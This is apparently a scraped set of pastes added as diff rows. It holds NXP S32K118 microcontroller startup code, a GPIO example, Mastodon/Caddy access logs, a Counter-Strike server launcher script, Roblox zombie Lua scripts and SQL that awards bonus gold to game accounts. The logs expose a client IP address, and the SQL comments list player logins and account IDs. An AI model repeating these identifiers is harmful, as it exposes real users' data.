+    #pragma section = "".data_init""
+    #pragma section = "".bss""
+    #pragma section = "".intvec""
+    #pragma section = "".customSection""
+    #pragma section = "".customSection_init""
+    #pragma section = ""__CODE_RAM""
+    #pragma section = ""__CODE_ROM""
+#endif
+
+/*!
+ * @brief Make necessary initializations for RAM.
+ *
+ * - Copy initialized data from ROM to RAM.
+ * - Clear the zero-initialized data section.
+ * - Copy the vector table from ROM to RAM. This could be an option.
+ */
+void init_data_bss(void);
+
+#endif /* STARTUP_H*/
+/*******************************************************************************
+ * EOF
+ ******************************************************************************/
+
+"
+rw121V0B,system_S32K118.c,Mike057,C,Sunday 8th of June 2025 11:20:58 AM CDT,"/*
+ * Copyright 2017-2023 NXP
+ *
+ * SPDX-License-Identifier: Apache-2.0
+ *
+ * Licensed under the Apache License, Version 2.0 (the License); you may
+ * not use this file except in compliance with the License.
+ * You may obtain a copy of the License at
+ *
+ * www.apache.org/licenses/LICENSE-2.0
+ *
+ * Unless required by applicable law or agreed to in writing, software
+ * distributed under the License is distributed on an AS IS BASIS, WITHOUT
+ * WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+ * See the License for the specific language governing permissions and
+ * limitations under the License
+ */
+
+/**
+ * @page misra_violations MISRA-C:2012 violations
+ *
+ * @section [global]
+ * Violates MISRA 2012 Advisory Rule 8.9, An object should be defined at block
+ * scope if its identifier only appears in a single function.
+ * An object with static storage duration declared at block scope cannot be
+ * accessed directly from outside the block.
+ *
+ * @section [global]
+ * Violates MISRA 2012 Advisory Rule 11.4, A conversion should not be performed
+ * between a pointer to object and an integer type.
+ * The cast is required to initialize a pointer with an unsigned int define,
+ * representing an address.
+ *
+ * @section [global]
+ * Violates MISRA 2012 Required Rule 11.6, A cast shall not be performed
+ * between pointer to void and an arithmetic type.
+ * The cast is required to initialize a pointer with an unsigned int define,
+ * representing an address.
+ *
+ * @section [global]
+ * Violates MISRA 2012 Advisory Rule 8.7, External could be made static.
+ * Function is defined for usage by application code.
+ *
+ */
+
+#include ""device_registers.h""
+#include ""system_S32K118.h""
+#include ""stdbool.h""
+
+/* ----------------------------------------------------------------------------
+   -- Core clock
+   ---------------------------------------------------------------------------- */
+
+uint32_t SystemCoreClock = DEFAULT_SYSTEM_CLOCK;
+
+/*FUNCTION**********************************************************************
+ *
+ * Function Name : SystemInit
+ * Description   : This function disables the watchdog, enables FPU
+ * and the power mode protection if the corresponding feature macro
+ * is enabled. SystemInit is called from startup_device file.
+ *
+ * Implements    : SystemInit_Activity
+ *END**************************************************************************/
+void SystemInit(void)
+{
+/**************************************************************************/
+/* WDOG DISABLE*/
+/**************************************************************************/
+
+#if (DISABLE_WDOG)
+    /* Write of the WDOG unlock key to CNT register, must be done in order to allow any modifications*/
+    IP_WDOG->CNT = (uint32_t ) FEATURE_WDOG_UNLOCK_VALUE;
+    /* The dummy read is used in order to make sure that the WDOG registers will be configured only
+     * after the write of the unlock value was completed. */
+    (void)IP_WDOG->CNT;
+
+    /* Initial write of WDOG configuration register:
+     * enables support for 32-bit refresh/unlock command write words,
+     * clock select from LPO, update enable, watchdog disabled */
+   IP_WDOG->CS  = (uint32_t ) ( (1UL << WDOG_CS_CMD32EN_SHIFT)                       |
+                              (FEATURE_WDOG_CLK_FROM_LPO << WDOG_CS_CLK_SHIFT)     |
+                              (0U << WDOG_CS_EN_SHIFT)                             |
+                              (1U << WDOG_CS_UPDATE_SHIFT)                         );
+
+    /* Configure timeout */
+    IP_WDOG->TOVAL = (uint32_t )0xFFFF;
+#endif /* (DISABLE_WDOG) */
+}
+
+/*FUNCTION**********************************************************************
+ *
+ * Function Name : SystemCoreClockUpdate
+ * Description   : This function must be called whenever the core clock is changed
+ * during program execution. It evaluates the clock register settings and calculates
+ * the current core clock.
+ *
+ * Implements    : SystemCoreClockUpdate_Activity
+ *END**************************************************************************/
+void SystemCoreClockUpdate(void)
+{
+    uint32_t SCGOUTClock = 0U;      /* Variable to store output clock frequency of the SCG module */
+    uint32_t regValue;              /* Temporary variable */
+    uint32_t divider;
+    bool validSystemClockSource = true;
+
+    divider = ((IP_SCG->CSR & SCG_CSR_DIVCORE_MASK) >> SCG_CSR_DIVCORE_SHIFT) + 1U;
+
+    switch ((IP_SCG->CSR & SCG_CSR_SCS_MASK) >> SCG_CSR_SCS_SHIFT)
+    {
+        case 0x1:
+            /* System OSC */
+            SCGOUTClock = CPU_XTAL_CLK_HZ;
+            break;
+        case 0x2:
+            /* Slow IRC */
+            regValue = (IP_SCG->SIRCCFG & SCG_SIRCCFG_RANGE_MASK) >> SCG_SIRCCFG_RANGE_SHIFT;
+            if (regValue != 0UL)
+            {
+                SCGOUTClock = FEATURE_SCG_SIRC_HIGH_RANGE_FREQ;
+            }
+            else
+            {
+                validSystemClockSource = false;
+            }
+            break;
+        case 0x3:
+            /* Fast IRC */
+            regValue = (IP_SCG->FIRCCFG & SCG_FIRCCFG_RANGE_MASK) >> SCG_FIRCCFG_RANGE_SHIFT;
+            if (regValue == 0x0UL)
+            {
+                SCGOUTClock = FEATURE_SCG_FIRC_FREQ0;
+            }
+            else
+            {
+                validSystemClockSource = false;
+            }
+            break;
+        default:
+            validSystemClockSource = false;
+            break;
+    }
+
+    if (validSystemClockSource == true)
+    {
+        SystemCoreClock = (SCGOUTClock / divider);
+    }
+}
+
+/*FUNCTION**********************************************************************
+ *
+ * Function Name : SystemSoftwareReset
+ * Description   : This function is used to initiate a system reset
+ *
+ * Implements    : SystemSoftwareReset_Activity
+ *END**************************************************************************/
+void SystemSoftwareReset(void)
+{
+    uint32_t regValue;
+
+    /* Read Application Interrupt and Reset Control Register */
+    regValue = S32_SCB->AIRCR;
+
+    /* Clear register key */
+    regValue &= ~( S32_SCB_AIRCR_VECTKEY_MASK);
+
+    /* Configure System reset request bit and Register Key */
+    regValue |= S32_SCB_AIRCR_VECTKEY(FEATURE_SCB_VECTKEY);
+    regValue |= S32_SCB_AIRCR_SYSRESETREQ(0x1u);
+
+    /* Write computed register value */
+    S32_SCB->AIRCR = regValue;
+}
+
+/*******************************************************************************
+ * EOF
+ ******************************************************************************/
+"
+eFpD1jWa,startup.c,Mike057,C,Sunday 8th of June 2025 11:19:40 AM CDT,"/*
+ * Copyright 2013 - 2014, Freescale Semiconductor, Inc.
+ * Copyright 2016-2021, 2023 NXP
+ *                                                                                                                                                                                                                                                     
+ * SPDX-License-Identifier: BSD-3-Clause
+ */
+
+/**
+ * @page misra_violations MISRA-C:2012 violations
+ *
+ * @section [global]
+ * Violates MISRA 2012 Advisory Rule 8.9, An object should be defined at block
+ * scope if its identifier only appears in a single function.
+ * All variables with this problem are defined in the linker files.
+ *
+ * @section [global]
+ * Violates MISRA 2012 Advisory Rule 8.11, When an array with external linkage
+ * is declared, its size should be explicitly specified.
+ * The size of the arrays can not be explicitly determined.
+ *
+ * @section [global]
+ * Violates MISRA 2012 Advisory Rule 11.4, A conversion should not be performed
+ * between a pointer to object and an integer type.
+ * The cast is required to initialize a pointer with an unsigned int define,
+ * representing an address.
+ *
+ * @section [global]
+ * Violates MISRA 2012 Required Rule 11.6, A cast shall not be performed
+ * between pointer to void and an arithmetic type.
+ * The cast is required to initialize a pointer with an unsigned int define,
+ * representing an address.
+ *
+ * @section [global]
+ * Violates MISRA 2012 Required Rule 2.1, A project shall not contain unreachable
+ * code.
+ * The condition compares two address defined in linker files that can be different.
+ *
+ * @section [global]
+ * Violates MISRA 2012 Advisory Rule 8.7, External could be made static.
+ * Function is defined for usage by application code.
+ *
+ * @section [global]
+ * Violates MISRA 2012 Mandatory Rule 17.3, Symbol 'MFSPR' undeclared, assumed
+ * to return int.
+ * This is an e200 Power Architecture Assembly instruction used to retrieve
+ * the core number.
+ *
+ */
+
+#include ""startup.h""
+#include <stdint.h>
+
+
+/*******************************************************************************
+ * Static Variables
+ ******************************************************************************/
+static volatile uint32_t * const s_vectors[NUMBER_OF_CORES] = FEATURE_INTERRUPT_INT_VECTORS;
+
+/*******************************************************************************
+ * Code
+ ******************************************************************************/
+
+/*FUNCTION**********************************************************************
+ *
+ * Function Name : init_data_bss
+ * Description   : Make necessary initializations for RAM.
+ * - Copy the vector table from ROM to RAM.
+ * - Copy initialized data from ROM to RAM.
+ * - Copy code that should reside in RAM from ROM
+ * - Clear the zero-initialized data section.
+ *
+ * Tool Chains:
+ *   __GNUC__           : GNU Compiler Collection
+ *   __ghs__            : Green Hills ARM Compiler
+ *   __ICCARM__         : IAR ARM Compiler
+ *   __DCC__            : Wind River Diab Compiler
+ *   __ARMCC_VERSION    : ARMC Compiler
+ *
+ * Implements    : init_data_bss_Activity
+ *END**************************************************************************/
+void init_data_bss(void)
+{
+    uint32_t n;
+    uint8_t coreId;
+/* For ARMC we are using the library method of initializing DATA, Custom Section and
+ * Code RAM sections so the below variables are not needed */
+#if !defined(__ARMCC_VERSION)
+    /* Declare pointers for various data sections. These pointers
+     * are initialized using values pulled in from the linker file */
+    uint8_t * data_ram;
+    uint8_t * code_ram;
+    uint8_t * bss_start;
+    uint8_t * custom_ram;
+    const uint8_t * data_rom, * data_rom_end;
+    const uint8_t * code_rom, * code_rom_end;
+    const uint8_t * bss_end;
+    const uint8_t * custom_rom, * custom_rom_end;
+#endif
+    /* Addresses for VECTOR_TABLE and VECTOR_RAM come from the linker file */
+
+#if defined(__ARMCC_VERSION)
+    extern uint32_t __RAM_VECTOR_TABLE_SIZE;
+    extern uint32_t __VECTOR_ROM;
+    extern uint32_t __VECTOR_RAM;
+#else
+    extern uint32_t __RAM_VECTOR_TABLE_SIZE[];
+    extern uint32_t __VECTOR_TABLE[];
+    extern uint32_t __VECTOR_RAM[];
+#endif
+    /* Get section information from linker files */
+#if defined(__ICCARM__)
+    /* Data */
+    data_ram        = __section_begin("".data"");
+    data_rom        = __section_begin("".data_init"");
+    data_rom_end    = __section_end("".data_init"");
+
+    /* CODE RAM */
+    #pragma section = ""__CODE_ROM""
+    #pragma section = ""__CODE_RAM""
+    code_ram        = __section_begin(""__CODE_RAM"");
+    code_rom        = __section_begin(""__CODE_ROM"");
+    code_rom_end    = __section_end(""__CODE_ROM"");
+
+    /* BSS */
+    bss_start       = __section_begin("".bss"");
+    bss_end         = __section_end("".bss"");
+
+    custom_ram      = __section_begin("".customSection"");
+    custom_rom      = __section_begin("".customSection_init"");
+    custom_rom_end  = __section_end("".customSection_init"");
+
+#elif defined (__ARMCC_VERSION)
+    /* VECTOR TABLE*/
+    uint8_t * vector_table_size = (uint8_t *)__RAM_VECTOR_TABLE_SIZE;
+    uint32_t * vector_rom    = (uint32_t *)__VECTOR_ROM;
+    uint32_t * vector_ram    = (uint32_t *)__VECTOR_RAM;
+#else
+    extern uint32_t __DATA_ROM[];
+    extern uint32_t __DATA_RAM[];
+    extern uint32_t __DATA_END[];
+
+    extern uint32_t __CODE_RAM[];
+    extern uint32_t __CODE_ROM[];
+    extern uint32_t __CODE_END[];
+
+    extern uint32_t __BSS_START[];
+    extern uint32_t __BSS_END[];
+
+    extern uint32_t __CUSTOM_ROM[];
+    extern uint32_t __CUSTOM_END[];
+
+    /* Data */
+    data_ram        = (uint8_t *)__DATA_RAM;
+    data_rom        = (uint8_t *)__DATA_ROM;
+    data_rom_end    = (uint8_t *)__DATA_END;
+    /* CODE RAM */
+    code_ram        = (uint8_t *)__CODE_RAM;
+    code_rom        = (uint8_t *)__CODE_ROM;
+    code_rom_end    = (uint8_t *)__CODE_END;
+    /* BSS */
+    bss_start       = (uint8_t *)__BSS_START;
+    bss_end         = (uint8_t *)__BSS_END;
+
+	/* Custom section */
+    custom_ram      = CUSTOMSECTION_SECTION_START;
+    custom_rom      = (uint8_t *)__CUSTOM_ROM;
+    custom_rom_end  = (uint8_t *)__CUSTOM_END;
+
+#endif
+
+#if !defined(__ARMCC_VERSION)
+    /* Copy initialized data from ROM to RAM */
+    while (data_rom_end != data_rom)
+    {
+        *data_ram = *data_rom;
+        data_ram++;
+        data_rom++;
+    }
+
+    /* Copy functions from ROM to RAM */
+    while (code_rom_end != code_rom)
+    {
+        *code_ram = *code_rom;
+        code_ram++;
+        code_rom++;
+    }
+
+    /* Clear the zero-initialized data section */
+    while(bss_end != bss_start)
+    {
+        *bss_start = 0;
+        bss_start++;
+    }
+
+    /* Copy customsection rom to ram */
+    while(custom_rom_end != custom_rom)
+    {
+        *custom_ram = *custom_rom;
+        custom_rom++;
+        custom_ram++;
+    }
+#endif
+    coreId = (uint8_t)GET_CORE_ID();
+#if defined (__ARMCC_VERSION)
+        /* Copy the vector table from ROM to RAM */
+                /* Workaround */
+        for (n = 0; n < (((uint32_t)(vector_table_size))/sizeof(uint32_t)); n++)
+        {
+            vector_ram[n] = vector_rom[n];
+        }
+        /* Point the VTOR to the position of vector table */
+         *s_vectors[coreId] = (uint32_t) __VECTOR_RAM;
+#else
+    /* Check if VECTOR_TABLE copy is needed */
+    if (__VECTOR_RAM != __VECTOR_TABLE)
+    {
+        /* Copy the vector table from ROM to RAM */
+        for (n = 0; n < (((uint32_t)__RAM_VECTOR_TABLE_SIZE)/sizeof(uint32_t)); n++)
+        {
+            __VECTOR_RAM[n] = __VECTOR_TABLE[n];
+        }
+        /* Point the VTOR to the position of vector table */
+        *s_vectors[coreId] = (uint32_t)__VECTOR_RAM;
+    }
+    else
+    {
+        /* Point the VTOR to the position of vector table */
+        *s_vectors[coreId] = (uint32_t)__VECTOR_TABLE;
+    }
+#endif
+
+}
+
+/*******************************************************************************
+ * EOF
+ ******************************************************************************/
+
+"
+DhrSvHjZ,main.c,Mike057,C,Sunday 8th of June 2025 11:18:14 AM CDT,"#include ""S32K118.h""
+
+
+int main(void) {
+
+    IP_PCC->PCCn[PCC_PORTE_INDEX] |= PCC_PCCn_CGC_MASK;
+   
+    IP_PORTE->PCR[8] &= ~PORT_PCR_MUX_MASK;
+    IP_PORTE->PCR[8] |= PORT_PCR_MUX(1);
+
+
+    IP_PTE->PDDR |= (1 << 8);
+
+	IP_PTE->PSOR = (1 << 8);
+
+    while (1) {
+
+    }
+
+    return 0;
+}
+"
+KmaAAJQH,Untitled,swaggboi,JSON,Sunday 8th of June 2025 10:57:37 AM CDT,"{""level"":""error"",""ts"":1749398174.602992,""logger"":""http.log.access.log0"",""msg"":""handled request"",""request"":{""remote_ip"":""2601:5cf:8601:64e1:3eec:efff:fec3:9ad1"",""remote_port"":""59112"",""proto"":""HTTP/1.1"",""method"":""PATCH"",""host"":""eattherich.club"",""uri"":""/api/v1/accounts/update_credentials"",""headers"":{""User-Agent"":[""HTTP-Thin/0.006""],""Content-Type"":[""application/x-www-form-urlencoded""],""Content-Length"":[""897332""],""Authorization"":[]},""tls"":{""resumed"":false,""version"":772,""cipher_suite"":4865,""proto"":"""",""server_name"":""eattherich.club""}},""user_id"":"""",""duration"":0.918898522,""size"":56,""status"":403,""resp_headers"":{""Content-Length"":[""56""],""X-Frame-Options"":[""DENY""],""Referrer-Policy"":[""same-origin""],""X-Runtime"":[""0.095343""],""X-Ratelimit-Limit"":[""300""],""Alt-Svc"":[""h3=\"":443\""; ma=2592000""],""Content-Type"":[""application/json; charset=utf-8""],""X-Content-Type-Options"":[""nosniff""],""X-Ratelimit-Reset"":[""2025-06-08T16:00:00.599394Z""],""Strict-Transport-Security"":[""max-age=63072000; includeSubDomains""],""Vary"":[""Authorization, Origin""],""X-Ratelimit-Remaining"":[""299""],""Cache-Control"":[""private, no-store""],""X-Request-Id"":[""737aea43-d594-4368-8830-3b32ce0c371d""],""Server"":[""Caddy"",""Mastodon""],""X-Xss-Protection"":[""0""],""Content-Security-Policy"":[""default-src 'none'; frame-ancestors 'none'; form-action 'none'""]}}"
+SSycHuLZ,Untitled,swaggboi,JSON,Sunday 8th of June 2025 10:50:13 AM CDT,"{""level"":""error"",""ts"":1749397766.6056633,""logger"":""http.log.access.log0"",""msg"":""handled request"",""request"":{""remote_ip"":""2601:5cf:8601:64e1:3eec:efff:fec3:9ad1"",""remote_port"":""46780"",""proto"":""HTTP/1.1"",""method"":""PATCH"",""host"":""eattherich.club"",""uri"":""/api/v1/accounts/update_credentials"",""headers"":{""User-Agent"":[""HTTP-Thin/0.006""],""Authorization"":[],""Content-Length"":[""897332""],""Content-Type"":[""application/x-www-form-urlencoded""]},""tls"":{""resumed"":false,""version"":772,""cipher_suite"":4865,""proto"":"""",""server_name"":""eattherich.club""}},""user_id"":"""",""duration"":0.88008502,""size"":56,""status"":403,""resp_headers"":{""Vary"":[""Authorization, Origin""],""X-Xss-Protection"":[""0""],""Strict-Transport-Security"":[""max-age=63072000; includeSubDomains""],""Referrer-Policy"":[""same-origin""],""X-Ratelimit-Reset"":[""2025-06-08T15:50:00.601218Z""],""X-Content-Type-Options"":[""nosniff""],""Server"":[""Caddy"",""Mastodon""],""X-Request-Id"":[""c93c3350-abbf-451b-80b9-d742aaa0413f""],""Content-Length"":[""56""],""X-Ratelimit-Remaining"":[""297""],""Cache-Control"":[""private, no-store""],""Alt-Svc"":[""h3=\"":443\""; ma=2592000""],""X-Runtime"":[""0.082311""],""X-Frame-Options"":[""DENY""],""Content-Security-Policy"":[""default-src 'none'; frame-ancestors 'none'; form-action 'none'""],""X-Ratelimit-Limit"":[""300""],""Content-Type"":[""application/json; charset=utf-8""]}}"
+q5xP8dX2,CSCO Server Starter Script,P1ayer4312,Batch,Sunday 8th of June 2025 10:14:26 AM CDT,"
+@REM #######################################################################################
+@REM #######################################################################################
+@REM #######################################################################################
+@REM #######################################################################################
+@REM #######################################################################################
+
+@ECHO off
+title CSCO Server Starter
+
+@REM This is a small script that allows creation of a server with each available gamemode
+
+set SERVER_NAME=""My CSCO Server""
+set SERVER_PORT=27015
+set MAX_PLAYERS=64
+set SERVER_DEFAULT_MAP=""de_dust2_csco""
+set TICK_RATE=128
+@REM 64 or 128
+
+@REM  Available maps:
+@REM    as_retreat_csco
+@REM    awp_india_csco
+@REM    cs_backalley_csco
+@REM    cs_militia_csco
+@REM    de_dust2_csco
+@REM    de_inferno_csco
+@REM    de_mirage_csco
+@REM    de_nuke_csco
+@REM    de_train_csco
+@REM    de_vertigo_csco
+@REM    fy_iceworld_csco
+@REM    fy_pool_day_csco_11
+@REM    tr_firingrange_csco
+@REM    ar_baggage
+@REM    de_shortdust
+@REM    dz_blacksite
+
+@REM #######################################################################################
+@REM #######################################################################################
+@REM #######################################################################################
+@REM #######################################################################################
+@REM #######################################################################################
+
+echo.
+echo.     Choose gamemode number:
+echo.
+echo.  1) The classic Counter-Strike experience
+echo.  2) The classic Condition Zero experience
+echo.  3) 5v5 Tournament mode
+echo.  4) Shorter Competitive
+echo.  5) 2v2 Competitive (Wingman)
+echo.  6) Arms Race (GunGame)
+echo.  7) Round based GunGame (Demolition)
+echo.  8) FFA Deathmatch
+echo.  9) Survive waves of bots (Guardian)
+echo. 10) Coop - Only works on maps meant for it (CoopStrike)
+echo. 11) Battle Royale - Only works on maps meant for it (Danger Zone)
+echo. 12) Scouts and knives, low gravity (Flying Scoutsman)
+echo. 13) Official retakes gamemode
+echo. 14) One in the Chamber
+echo. 15) Zombie Mod
+echo. 16) Custom (No gamemode)
+echo. 17) Retreat (VIP protect) - Normal
+echo. 18) Retreat (VIP protect) - Condition Zero
+echo.
+
+:INPUT_LOOP
+set /p USER_INPUT=""Enter value: ""
+IF %USER_INPUT% LEQ 18 (
+  IF %USER_INPUT% GEQ 1 (
+    goto:SERVER_ARGS
+  )
+)
+echo Invalid value
+goto:INPUT_LOOP
+
+:SERVER_ARGS
+set ""ARGS=""
+
+IF %USER_INPUT% EQU 1 (
+  set ""ARGS=+game_type 0 +game_mode 0""
+  goto:START_SERVER
+)
+IF %USER_INPUT% EQU 2 (
+  set ""ARGS=+game_type 0 +game_mode 0 +sv_skirmish_id 22 +sv_game_mode_flags 4""
+  goto:START_SERVER
+)
+IF %USER_INPUT% EQU 3 (
+  set MAX_PLAYERS=10
+  set ""ARGS=+game_type 0 +game_mode 1""
+  goto:START_SERVER
+)
+IF %USER_INPUT% EQU 4 (
+  set MAX_PLAYERS=10
+  set ""ARGS=+game_type 0 +game_mode 1 +sv_game_mode_flags 32""
+  goto:START_SERVER
+)
+IF %USER_INPUT% EQU 5 (
+  set MAX_PLAYERS=4
+  set ""ARGS=+game_type 0 +game_mode 2""
+  goto:START_SERVER
+)
+IF %USER_INPUT% EQU 6 (
+  set ""ARGS=+game_type 1 +game_mode 0""
+  goto:START_SERVER
+)
+IF %USER_INPUT% EQU 7 (
+  set ""ARGS=+game_type 1 +game_mode 1""
+  goto:START_SERVER
+)
+IF %USER_INPUT% EQU 8 (
+  set ""ARGS=+game_type 1 +game_mode 2""
+  goto:START_SERVER
+)
+IF %USER_INPUT% EQU 9 (
+  set ""ARGS=+game_type 4 +game_mode 0""
+  goto:START_SERVER
+)
+IF %USER_INPUT% EQU 10 (
+  set ""ARGS=+game_type 4 +game_mode 1""
+  goto:START_SERVER
+)
+IF %USER_INPUT% EQU 11 (
+  @REM Here it's hardcoded to be 'dz_blacksite' remove the line below if you want to change the map
+  set SERVER_DEFAULT_MAP=""dz_blacksite""
+  set ""ARGS=+game_type 6 +game_mode 0""
+  goto:START_SERVER
+)
+IF %USER_INPUT% EQU 12 (
+  set ""ARGS=+game_type 0 +game_mode 0 +sv_skirmish_id 3""
+  goto:START_SERVER
+)
+IF %USER_INPUT% EQU 13 (
+  set ""ARGS=+game_type 0 +game_mode 0 +sv_skirmish_id 12""
+  goto:START_SERVER
+)
+IF %USER_INPUT% EQU 14 (
+  set ""ARGS=+game_type 1 +game_mode 2 +sv_skirmish_id 21""
+  goto:START_SERVER
+)
+IF %USER_INPUT% EQU 15 (
+  set ""ARGS=+game_type 0 +game_mode 0 +sv_skirmish_id 23""
+  goto:START_SERVER
+)
+IF %USER_INPUT% EQU 16 (
+  set ""ARGS=+game_type 3 +game_mode 0""
+  goto:START_SERVER
+)
+@REM I guess it checks based on map data if it's Retreat or not, hardcoded to ""as_retreat_csco"" for now
+IF %USER_INPUT% EQU 17 (
+  set SERVER_DEFAULT_MAP=""as_retreat_csco""
+  set ""ARGS=+game_type 0 +game_mode 0""
+  goto:START_SERVER
+)
+IF %USER_INPUT% EQU 18 (
+  set SERVER_DEFAULT_MAP=""as_retreat_csco""
+  set ""ARGS=+game_type 0 +game_mode 0 +sv_skirmish_id 22 +sv_game_mode_flags 4""
+  goto:START_SERVER
+)
+
+:START_SERVER
+start srcds.exe -game csco/csgo -console -usercon %ARGS% +sv_max_players %MAX_PLAYERS% -maxplayers %MAX_PLAYERS% -maxplayers_override %MAX_PLAYERS% +hostname %SERVER_NAME% +map %SERVER_DEFAULT_MAP% -tickrate %TICK_RATE% -port %SERVER_PORT%"
+qVWP9ijb,Zombie,GigaOrts,Lua,Sunday 8th of June 2025 10:04:28 AM CDT,"-- PlayerConnect
+function whenLoaded(player)
+	warn(""Игрок"", player, ""подключился к игре!"")
+	script.Parent.Player.Value = player
+	print(script.Parent.Player.Value)
+end
+game.Players.PlayerAdded:Connect(whenLoaded)
+
+--ZombieSpawn
+working = true
+local distance = 0
+while working do
+	for _, player in pairs(game.Players:GetPlayers()) do
+		distance = player:DistanceFromCharacter(script.Parent.Position)
+		if (distance > 0) and (distance < 50) then
+			working = false
+		end
+	end
+	wait(1)
+end
+wait(2)
+D_num = script.Parent.Parent.Quantity
+while D_num.Value < 10 do
+	if distance < 50 then
+		local zombie = game.ServerStorage.Zombie:Clone()
+		zombie.Parent = game.Workspace.NPC
+		zombie:MoveTo(script.Parent.Position)
+		D_num.Value += 1
+	end
+	local destination = game.Workspace.Data.Player.Value.Character.HumanoidRootPart.Position
+	distance = (destination - script.Parent.Position).magnitude
+	wait(5)
+end
+
+
+--SeekEnemy
+local npc = script.Parent --получаем модель НПС
+local humanoid = npc:WaitForChild(""Humanoid"") --получаем гуманоида из модели, с его помощью будем двигать НПС
+local rootPart = npc:WaitForChild(""HumanoidRootPart"") --получаем корневую деталь из модели, от неё будем брать позицию НПС
+local nearestPlayerPos = nil --создаем переменную для ближайшего игрока
+local shortestDistance = 100 -- Большое значение для сравнения
+
+local function getNearestPlayerPos() --функция, которая ищет позицию ближайшего игрока
+	for _, player in ipairs(game.Players:GetPlayers()) do --перебираем всех игроков в игре
+		local character = player.Character --получаем модель игрока
+		if character and character:FindFirstChild(""HumanoidRootPart"") then --если модель найдена и имеет корневую деталь
+			local characterRootPos = character.HumanoidRootPart.Position --Получаем позицию игрока
+			local distance = (characterRootPos - rootPart.Position).Magnitude --считаем растояние между игроком и НПС
+			if distance < shortestDistance then
+				shortestDistance = distance --сохраняем новое ближайшее растояние
+			end
+			if distance < 50 then --если растояние меньше 50 и меньше предыдущего, запоминаем его
+				nearestPlayerPos = characterRootPos --сохраняем игрока как ближайшего
+			end
+		end
+	end
+	return nearestPlayerPos --возвращаем позицию ближайшего игрока
+end
+
+while wait() do --запускаем бесконечный цикл
+	local nearestPlayerPos = getNearestPlayerPos() --получаем ближайшего игрока
+	if nearestPlayerPos then --если нашли ближайшего игрока
+		humanoid:MoveTo(nearestPlayerPos) --двигаем НПС к ближайшему игроку
+	end
+end
+
+--ZombieAttack
+local rarm = script.Parent:FindFirstChild(""RightHand"")
+local larm = script.Parent:FindFirstChild(""LeftHand"")
+local torso = script.Parent:FindFirstChild(""UpperTorso"")
+local Attack_Speed = script.Parent.Parent.AttackSpeed
+
+function dmg(hit)
+	if hit.Parent ~= nil then
+		local hum = hit.Parent:FindFirstChild(""Humanoid"")
+		if hum ~= nil then
+			hum.Health = hum.Health - 0.1
+		end
+		wait(Attack_Speed.Value)
+
+	end
+end
+
+
+rarm.Touched:Connect(dmg)
+larm.Touched:Connect(dmg)
+torso.Touched:Connect(dmg)"
+PquQYaDS,Untitled,Locative,SQL,Sunday 8th of June 2025 09:52:17 AM CDT,"UPDATE bonus SET gold=gold+1000 WHERE id=1399060; -- [Tomford] (GUID: 7123207) Аккаунт: megre (id: 1399060)
+INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (1399060, NOW(), 1000, '1000 золотых бонусов за 28-ой сезон арены 2х2.');
+
+UPDATE bonus SET gold=gold+1000 WHERE id=1891128; -- [Excalibur] (GUID: 6100683) Аккаунт: Swoksaar1990 (id: 1891128)
+INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (1891128, NOW(), 1000, '1000 золотых бонусов за 28-ой сезон арены 2х2.');
+
+UPDATE bonus SET gold=gold+2000 WHERE id=1236003; -- [Форельх] (GUID: 6186742) Аккаунт: 414en (id: 1236003)
+INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (1236003, NOW(), 2000, '2000 золотых бонусов за 28-ой сезон арены 3x3.');
+
+UPDATE bonus SET gold=gold+2000 WHERE id=1737032; -- [Drumandbass] (GUID: 6888754) Аккаунт: Dimdim1986 (id: 1737032)
+INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (1737032, NOW(), 2000, '2000 золотых бонусов за 28-ой сезон арены 3x3.');
+
+UPDATE bonus SET gold=gold+2000 WHERE id=1285245; -- [Incarnwinx] (GUID: 6804091) Аккаунт: Arrysius (id: 1285245)
+INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (1285245, NOW(), 2000, '2000 золотых бонусов за 28-ой сезон арены 3x3.');
+
+UPDATE bonus SET gold=gold+1800 WHERE id=334567; -- [Yohio] (GUID: 3724472) Аккаунт: juansantosfl (id: 334567)
+INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (334567, NOW(), 1800, '1800 золотых бонусов за 28-ой сезон арены 3x3.');
+
+UPDATE bonus SET gold=gold+1800 WHERE id=1575905; -- [Oneshot] (GUID: 6927078) Аккаунт: codcodrin (id: 1575905)
+INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (1575905, NOW(), 1800, '1800 золотых бонусов за 28-ой сезон арены 3х3.');
+
+UPDATE bonus SET gold=gold+1800 WHERE id=1399060; -- [Tomford] (GUID: 7123207) Аккаунт: megre (id: 1399060)
+INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (1399060, NOW(), 1800, '1800 золотых бонусов за 28-ой сезон арены 3х3.');
+
+UPDATE bonus SET gold=gold+1800 WHERE id=390896; -- [Matma] (GUID: 6667848) Аккаунт: gutol (id: 390896)
+INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (390896, NOW(), 1800, '1800 золотых бонусов за 28-ой сезон арены 3х3.');
+
+UPDATE bonus SET gold=gold+1500 WHERE id=390896; -- [Haori] (GUID: 6674791) Аккаунт: gutol (id: 390896)
+INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (390896, NOW(), 1500, '1500 золотых бонусов за 28-ой сезон арены SoloQ 3x3.');
+
+UPDATE bonus SET gold=gold+1500 WHERE id=787774; -- [Lampz] (GUID: 6889670) Аккаунт: rone2 (id: 787774)
+INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (787774, NOW(), 1500, '1500 золотых бонусов за 28-ой сезон арены SoloQ 3x3.');
+
+UPDATE bonus SET gold=gold+1500 WHERE id=1737032; -- [Drumandbass] (GUID: 6888754) Аккаунт: Dimdim1986 (id: 1737032)
+INSERT INTO `bonus_log`(`user_id`, `created`, `bonus`, `msg`) VALUES (1737032, NOW(), 1500, '1500 золотых бонусов за 28-ой сезон арены SoloQ 3x3.');
+
+UPDATE bonus SET gold=gold+1000 WHERE id=1575085; -- [Roelsmvp] (GUID: 3323476) Аккаунт: mygamelevl54 (id: 1575085)
